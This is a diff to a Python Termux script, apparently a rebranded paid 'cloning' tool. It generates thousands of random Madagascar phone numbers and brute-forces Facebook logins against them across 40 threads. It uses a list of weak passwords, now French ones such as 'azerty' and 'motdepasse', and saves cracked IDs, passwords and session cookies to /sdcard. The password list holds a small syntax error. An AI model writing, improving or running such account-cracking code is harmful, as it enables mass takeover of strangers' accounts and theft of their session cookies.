@@ -1,15 +1,19 @@
-import getpass
-import subprocess
+# Définir le numéro de version
+version_actuelle = "2.0"
+
+
+
 import os
-from os import system as clr
 import random
 import string 
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import re
-import sys
 import uuid
 import json
+import subprocess
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import sys
+import secrets
+import getpass
 
 # Mot de passe pour déverrouiller le script
 mot_de_passe = "ITACHI2024"
@@ -37,40 +41,45 @@ bblue="\033[1;34m"          # Blue
 P="\033[1;35m"        # Purple
 C="\033[1;36m"          # Cyan
 B="\033[1;37m"         # White
-my_color = [B,C,P,H]
+my_color = [
+ B,C,P,H]
 warna = random.choice(my_color)
 oks=[]
 cps=[]
 loop=0
-
+# Liste des couleurs pour le logo, les lignes et chaque mot
+logo_colors = [B, C, P, H]
+line_colors = [bblack, M, H, byellow, bblue, P, C, B]
+word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 #-------------logo-----------------#
 logo=(f'''{B}
- _____  ___    _______   __    _____  ___   
-(\"   \|"  \  /"     "| |" \  (\"   \|"  \  
-|.\\   \    |(: ______) ||  | |.\\   \    | 
-|: \.   \\  | \/    |   |:  | |: \.   \\  | 
-|.  \    \. | // ___)_  |.  | |.  \    \. | 
-|    \    \ | (:      "| /\  |\|    \    \ | 
- \___|\____\) \_______)(__\_|_)\___|\____\) 
-                                            
-{warna}--------------------------------------------{B}
- Owner    : CHRICE999
- TOOL NAME : NEIN
- GROUPE-FB   : [TERMUX-COMAND]
- STATUE : FREE
- Facebook : {bblue}ITACHI SQ{bblue}
- Tools    : {warna}[{M}VERSION 1.1{warna}]{warna}
---------------------------------------------{B}''')
 
+
+                                 
+,--.  ,--.,------.,--.,--.  ,--. 
+|  ,'.|  ||  .---'|  ||  ,'.|  | 
+|  |' '  ||  `--, |  ||  |' '  | 
+|  | `   ||  `---.|  ||  | `   | 
+`--'  `--'`------'`--'`--'  `--' 
+                                 
+
+                                            
+
+{warna}--------------------------------------------{B}
+ Owner    : {M}SAFIDINIAINA{M}
+ TOOL NAME : {warna}{P}SAFIDY{P}{warna}
+ GROUPE-FB   : NONE
+ STATUE : {H}PAID{H}
+ Facebook : {bblue}SM{bblue}
+ Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
+--------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
     print(f'{warna}--------------------------------------------{B}')
-
 #-------------clear def -------------#
 def clear():
-    clr('clear')
+    os.system('clear')
     print(logo)
-
 #-------------main def------------#
 def MR_ITACHI():
     clear()
@@ -83,12 +92,11 @@ def MR_ITACHI():
         BD_CLONING()
     else:
         exit(' MERCI BEAUCOUP  :)')
-
 #------------- bd clone def ----------#
 def BD_CLONING():
     user=[]
     clear()
-    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
+    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
     print(' 261=0 Madagascar : [032] [034] [038] [033]')
     code=input(' ENTER SIM CODE >> ')
     linex()
@@ -99,9 +107,9 @@ def BD_CLONING():
         limit=50000
     clear()
     for nmbr in range(limit):
-        nmp=''.join(random.choice(string.digits) for _ in range(7))
+        nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=30) as Dipto:
+    with tred(max_workers=40) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -109,15 +117,15 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'123456','123456789','azerty','admin','1234561','azertyuiop','loulou','000000','doudou','password,'marseille','motdepasse','12345678','chouchou','soleil']
             Dipto.submit(method_crack,ids,passlist)
+            
     linex()
     print(' LE CLONING EST FINI ')
     print(' TOTAL OK ID '+str(len(oks)))
     print(' TOTAL CP ID '+str(len(cps)))
     input(' PRESS ENTER TO BACK  : ')
     MR_ITACHI()
-
 #------------ method crack def ---------#
 def method_crack(ids, passlist):
     global oks
@@ -141,21 +149,21 @@ def method_crack(ids, passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
-                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
-                    if not os.path.exists("ITACHI-IDS"):
-                        os.makedirs("ITACHI-IDS")
-                    # Enregistrer dans le fichier ITACHI-OK.txt
-                    with open(os.path.join("ITACHI-IDS", "ITACHI-OK.txt"), 'a') as f:
+                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
+                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
+                        os.makedirs("/sdcard/SAFIDY-IDS")
+                    # Enregistrer dans le fichier SAFIDY-OK.txt
+                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[ITACHI-CP] '+ids+' | '+pas+'\033[1;37m')
-                # Enregistrer dans le fichier ITACHI-CP.txt
-                with open(os.path.join("ITACHI-IDS", "ITACHI-CP.txt"), 'a') as f:
+                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier SAFIDY-CP.txt
+                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
                     f.write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
@@ -164,6 +172,12 @@ def method_crack(ids, passlist):
         loop+=1
     except:
         pass
-
 #-------------end----------------#
+
+# Générateur de séquence aléatoire
+def generate_random_sequence(length):
+    sequence = [random.choice(string.digits) for _ in range(length)]
+    return sequence
+
+# Appel à la fonction MR_ITACHI pour démarrer le programme
 MR_ITACHI()
